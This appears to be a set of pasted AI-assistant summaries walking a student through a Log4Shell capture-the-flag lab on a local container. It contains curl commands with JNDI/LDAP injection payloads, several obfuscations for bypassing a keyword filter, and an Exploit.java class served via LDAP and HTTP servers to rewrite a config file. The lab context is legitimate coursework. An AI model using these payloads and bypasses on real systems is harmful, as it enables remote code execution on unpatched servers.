@@ -1,0 +1,194 @@
+Here's a summary of what we've achieved so far and what's left to capture the flag:
+What We've Achieved:
+
+We've identified the target: modifying the "config.properties" file to set the rating property to your GATECH_ID (904074283)
+We've found the attack vector: the "dangerZone" parameter in the cartoon endpoint
+We've created and compiled the Exploit.java file that should update the properties file
+We've set up the Python HTTP server (port 8888) to serve our Exploit.class
+We've set up the LDAP server (port 4444) to redirect to our Exploit.class
+We've confirmed the "dangerZone" parameter accepts input and logs it
+
+What's Left to Do:
+
+We need to successfully bypass the JNDI security filter - we've been getting a "teapot" error (HTTP 418) indicating the application is blocking our attempt
+We need to find the right obfuscation technique that will:
+
+Pass through curl's URL parsing (we've had issues with nested braces)
+Bypass the application's security filter
+Successfully trigger the Log4j vulnerability to execute our Java code
+
+
+
+Let's try a different approach to bypass the security filter. We could try encoding the "jndi:ldap" portion differently or use a different obfuscation technique.
+Let's try this approach:
+Copycurl -g "http://localhost:8080/rest/cartoons/cartoon/d9aa318c-1cf6-41d1-841d-6be846de79fd?dangerZone=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A4444%2FExploit%7D" -H "GATECH_ID:904074283"
+This is a URL-encoded version of ${jndi:ldap://localhost:4444/Exploit}
+If this doesn't work, we may need to try more advanced obfuscation techniques or check if there are any issues with our servers or Exploit.java code.
+
+
+
+
+---- 
+
+
+Here's a summary of what we've done so far and what to do next:
+What We've Done:
+
+We identified that we need to modify the config.properties file to change the "rating" property to your GATECH_ID (904074283)
+We found the "dangerZone" parameter in the cartoon endpoint is a potential attack vector
+We've set up the LDAP server and Python HTTP server to serve our exploit
+We've written an Exploit.java file that should update the properties file correctly
+We confirmed that direct JNDI injection attempts are blocked with a "teapot" error (HTTP 418)
+We've tried various obfuscation techniques to bypass the protection, but haven't successfully triggered our exploit yet
+
+What We Need to Do Next:
+
+We need to determine if "dangerZone" is actually the correct attack vector or if there's another parameter we're missing
+We need to find an obfuscation technique that will:
+
+Not trigger the JNDI protection filter
+Actually be interpreted by Log4j to execute our JNDI lookup
+
+
+We need to ensure our exploit runs at the right time in the application flow to update the config.properties file before it's used
+
+Let's try examining the logs more carefully to see if there's another parameter we've missed, and then try a different obfuscation technique that might work better.
+
+
+
+
+
+## Summary of What We've Achieved So Far and Next Steps
+
+### What We've Achieved:
+1. We've identified the attack vector: the `dangerZone` parameter in the cartoon endpoint (which was initially set to null)
+2. We've created and compiled an Exploit.java file that updates the config.properties file to set the "rating" property to your GATECH_ID (904074283)
+3. We've set up the necessary servers:
+   - Python HTTP server (port 8888) to serve our Exploit.class
+   - LDAP server (port 4444) to redirect to our Exploit.class
+4. We've successfully passed various obfuscated payloads into the dangerZone parameter that didn't trigger the security filter
+
+### Current Challenges:
+1. While we're successfully bypassing the security filter with obfuscation techniques, our payloads aren't being properly resolved by Log4j to actually trigger the JNDI lookup
+2. The system is responding without errors, but our Exploit code isn't running
+
+### Next Steps to Get the Flag:
+1. **Try a different obfuscation technique**: We need to find just the right obfuscation that both bypasses the security filter AND is properly resolved by Log4j
+   ```bash
+   curl "http://localhost:8080/rest/cartoons/cartoon/3e8a1646-df53-4cbd-8e76-91f20631c8f8?dangerZone=%24%7Bjndi%3aldap%3a//localhost%3a4444/Exploit%7D" -H "GATECH_ID:904074283"
+   ```
+
+2. **Restart the container**: This can help ensure the system is in a clean state
+   ```bash
+   cd ~/Desktop/log4shell
+   ./stopContainer.sh
+   ./startContainer.sh
+   ```
+
+3. **Verify the exploit code**: Make sure our Exploit.java is properly reading the existing properties and only updating the "rating" property while preserving all other properties
+
+4. **Check timing**: We need to ensure our exploitation is happening at the right time in the application flow, before the properties file is read to render the response
+
+Our goal remains to update the config.properties file to set the rating to your GATECH_ID, triggering the flag to appear in the response.
+
+
+
+
+
+---- 
+
+
+
+Here's a summary of what we've achieved so far and what to do next:
+What We've Achieved:
+
+We've identified the attack vector: the dangerZone parameter in the cartoon endpoint
+We've set up our environment with the LDAP server and HTTP server
+We've created and compiled an Exploit.java file that should update the config.properties file
+We've tried various obfuscation techniques to bypass security filters, but they're not working as expected
+
+Next Steps:
+There are a few things we should try:
+
+Try a simpler obfuscation technique from the Bishop Fox article (which is a common reference for Log4Shell exploits):
+
+bashCopycurl "http://localhost:8080/rest/cartoons/cartoon/199e2750-e3ac-42a6-a264-8faf4e25a4be?dangerZone=%24%7Bjndi%3a${env:NaN:-l}${env:NaN:-d}${env:NaN:-a}${env:NaN:-p}%3a%2f%2flocalhost%3a4444%2fExploit%7D" -H "GATECH_ID:904074283"
+
+We might also try the context switching technique:
+
+bashCopycurl "http://localhost:8080/rest/cartoons/cartoon/199e2750-e3ac-42a6-a264-8faf4e25a4be?dangerZone=%24%7B%24%7Benv%3ABARFOO%3A-j%7Dndi%3A%24%7Benv%3ABARFOO%3A-l%7Ddap%3A%2F%2Flocalhost%3A4444%2FExploit%7D" -H "GATECH_ID:904074283"
+
+If those don't work, we should revisit our Exploit.java file to ensure it's correctly reading and updating the properties file. Here's a simpler version:
+
+javaCopyimport java.io.*;
+import java.util.Properties;
+
+public class Exploit {
+    static {
+        try {
+            // Load properties file
+            Properties props = new Properties();
+            FileInputStream in = new FileInputStream("config.properties");
+            props.load(in);
+            in.close();
+            
+            System.out.println("Original properties: " + props);
+            
+            // Update rating to GATECH_ID
+            props.setProperty("rating", "904074283");
+            
+            // Save properties file
+            FileOutputStream out = new FileOutputStream("config.properties");
+            props.store(out, null);
+            out.close();
+            
+            System.out.println("Updated properties: " + props);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+Let's start with trying the obfuscation techniques. Which step would you like to try first?
+
+
+
+
+----- 
+
+
+Detailed Progress on Flag 3 Capture
+Here's a detailed explanation of what we've achieved so far and our next steps to capture the flag:
+What We've Achieved
+
+We've identified the attack vector: The dangerZone query parameter in the cartoon endpoint. This parameter appears in the logs as dangerZone= null when not specified, and we confirmed it accepts input by passing ?dangerZone=test.
+We've set up the required infrastructure:
+
+Created an Exploit.java file that reads the config.properties file, preserves all existing properties, and updates only the rating property to our GATECH_ID (904074283)
+Compiled the Exploit.java file into Exploit.class
+Started a Python HTTP server running on port 8888 to serve our Exploit.class
+Started an LDAP server on port 4444 to redirect to our Exploit.class
+
+
+We've verified that the system is reading the config.properties file, which currently has a rating value of "PG"
+
+Next Steps
+
+Inject a Log4j vulnerability: We need to send a JNDI lookup expression through the dangerZone parameter to execute our exploit.
+Bypass security filters: The instruction mentions "Someone might have tried to roll their own patch and tried to deny requests containing malicious string patterns", which suggests we need to obfuscate our payload.
+Test and verify: After a successful exploit, we should see the rating property in config.properties change to "904074283", and the flag should appear in the response.
+
+Action Plan
+
+First, let's test if Log4j will interpret expressions in the dangerZone parameter:
+bashCopycurl 'http://localhost:8080/rest/cartoons/cartoon/2438fdaa-fa97-45fd-a35d-934a42f3c21c?dangerZone=${java:version}' -H 'GATECH_ID:904074283'
+
+If that works, we'll then try our JNDI injection:
+bashCopycurl 'http://localhost:8080/rest/cartoons/cartoon/2438fdaa-fa97-45fd-a35d-934a42f3c21c?dangerZone=${jndi:ldap://172.17.0.1:4444/Exploit}' -H 'GATECH_ID:904074283'
+
+If we encounter security filters, we'll need to obfuscate the payload using techniques like character substitution or encoding:
+bashCopy# Example obfuscation technique
+curl 'http://localhost:8080/rest/cartoons/cartoon/2438fdaa-fa97-45fd-a35d-934a42f3c21c?dangerZone=${${env:NaN:-j}${env:NaN:-n}${env:NaN:-d}${env:NaN:-i}:${env:NaN:-l}${env:NaN:-d}${env:NaN:-a}${env:NaN:-p}://172.17.0.1:4444/Exploit}' -H 'GATECH_ID:904074283'
+
+Finally, we'll verify success by checking if our GATECH_ID appears in the rating field of the response.
+
+Let's proceed step by step with these actions to capture the flag.
